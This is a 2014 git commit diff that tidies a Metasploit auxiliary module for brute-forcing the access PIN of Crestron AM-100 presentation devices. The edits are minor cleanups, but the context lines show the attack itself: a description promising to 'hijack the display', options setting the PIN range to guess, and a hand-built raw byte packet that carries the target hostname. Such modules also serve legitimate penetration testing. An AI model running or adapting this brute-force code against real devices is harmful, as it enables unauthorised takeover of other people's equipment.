6c9fea9b5149b20ccb4558aaedade4a4725437a0
dcnoren <dcnoren@gmail.com>
2014-10-08 13:49:49 -0400

    Update crestron_am100_pin_bruteforce.rb
    Removed unnecessary lines and content.

--- modules/auxiliary/gather/crestron_am100_pin_bruteforce.rb
+++ modules/auxiliary/gather/crestron_am100_pin_bruteforce.rb
@@ -20,12 +20,10 @@ class Metasploit3 < Msf::Auxiliary
         seconds to allow you to connect. This tool will work regardless of
         whether somebody is presenting on the display already or not, and
         will allow you to hijack the display.
-        %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
         WARNING: You MUST set RHOST as the hostname of the device, not
         the IP address of the device.
       },
       'Author'         => [ 'David Noren <dcnoren[at]gmail.com>' ],
-      'Version'        => '$Revision: 11 $',
       'License'        => MSF_LICENSE,
       'References'     =>
         [
@@ -35,7 +33,6 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        Opt::RHOST(''),
         Opt::RPORT(389),
         OptInt.new('MIN', [ true, "The lowest PIN to guess.", 0 ]),
         OptInt.new('MAX', [ true, "The highest PIN to guess.", 9999 ]),
@@ -68,7 +65,6 @@ class Metasploit3 < Msf::Auxiliary
 
     while counter <= max do
       pinguess = "%04d" % counter
-      sploit = ""
       sploit = "\x24\x01\xc7\x25\xa7\x40\x00\x21\xcc\xcd\x05\x39\x08\x00\x45\x00\x00\xb1\x7e\xed\x40\x00\x80\x06\x00\x00\x0a\x5d\x0e\x2d\x0a\x5d\x5c\xc4\x80\x18\x01\x85\xc1\x4f\x27\x70\x0b\x43\xe6\xde\x50\x18\x01\x00\x80\x4e\x00\x00\x77\x70\x70\x63\x6d\x64\x00\x00\x92"
       sploit += datastore['RHOST']
       sploit += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x5d\x0e\x2d"
